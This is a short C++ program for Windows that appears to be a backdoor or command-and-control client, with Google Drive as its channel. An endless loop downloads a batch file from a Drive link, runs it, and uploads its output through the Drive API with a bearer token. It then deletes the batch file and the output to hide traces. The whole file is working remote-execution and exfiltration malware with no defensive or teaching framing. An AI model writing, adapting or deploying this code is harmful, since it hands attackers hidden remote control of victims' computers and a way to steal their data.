#include <windows.h>
#include <stdio.h>
#include <string>

int main() {

    while (true){
        WinExec("cmd /c curl -L \"https://drive.google.com/uc?export=download&id={FILE ID}\" -o %temp%\\run.bat",1);
        Sleep(1000);
        WinExec("cmd /c %temp%\\run.bat > %temp%\\output.txt",1);
        Sleep(20000);
        WinExec("cmd /c curl -X POST -L -H \"Authorization: Bearer {GOOGLE API KEY}\" -F \"metadata={name : 'output.txt'};type=application/json;charset=UTF-8\" -F \"file=@output.txt\" \"https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart\"",1);
        Sleep(1000);
        WinExec("cmd /c del %temp%\\output.txt",1);
        WinExec("cmd /c del %temp%\\run.bat",1);
    }
}
